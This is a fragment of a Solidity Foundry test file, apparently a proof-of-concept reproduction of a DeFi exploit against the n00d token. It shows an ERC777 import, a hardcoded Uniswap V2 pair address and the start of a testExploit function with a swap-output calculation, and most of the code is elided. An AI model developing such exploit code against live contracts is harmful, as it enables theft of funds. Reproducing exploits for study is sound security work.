...
import {IERC777} from "src/interfaces/IERC777.sol";
...
contract ContractTest is Test {
    ...
    IUniswapV2Pair Pair =
        IUniswapV2Pair(0x5476DB8B72337d44A6724277083b1a927c82a389);
    ...
    function testExploit() public {
        ...
        uint256 amountOut = (amountIn * 997 * WETHR) /
            (amountIn * 997 + n00dR * 1000);
